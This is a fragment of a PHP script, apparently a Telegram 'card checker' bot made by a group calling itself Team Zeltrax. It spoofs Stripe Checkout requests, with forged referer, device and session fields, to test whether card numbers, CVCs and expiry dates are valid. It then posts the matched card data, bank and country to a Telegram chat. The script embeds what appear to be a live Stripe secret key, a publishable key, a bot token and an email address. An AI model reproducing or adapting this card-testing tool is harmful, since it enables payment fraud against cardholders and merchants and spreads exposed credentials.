...
$botToken = "1251046097:AAHpEYcF0HdA6Cx2YKNJPapiOq1Qe7fHsVg"; // Enter ur bot token
...
$skeys = array(
  1 => 'sk_live_yewEyUcu5YErW4Sv8TK9S8Ka00YIrpYaus', // Enter at least one sk key
...
'referer: https://checkout.stripe.com/v3/eM53SWcDPA0pSZKQj2A.html?distinct_id=efde3d17-d06d-c05d-b997-97d11cb58080',
'sec-fetch-mode: cors',
...
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=kazrllllz79%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+(stripe.js%2F8ab9a2f)&user_agent=Mozilla%2F5.0+(Linux%3B+Android+9%3B+Redmi+Y2)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F84.0.4147.27+Mobile+Safari%2F537.36&device_id=c336c778-0916-475c-9512-2632b2492be1&referrer=https%3A%2F%2Fsignup.realtimereviews.com%2F&time_checkout_opened=1600269888&time_checkout_loaded=1600269887&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[name]=kazrllllz79%40gmail.com&card[address_zip]=10028&time_on_page=11493&guid=8d22c8a8-8723-4b3d-992c-1b4673827353&muid=e681e759-3a7c-4cb5-977c-e5fcc4d6d379&sid=5b08cba3-5d2e-4007-a7e9-6d69d1f752c7&key=pk_live_4epurAT4TUCzQlkNjbYFsWiX');
...
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Team Zeltrax @ZeltraxRockz</b>");
}
elseif(!$result){
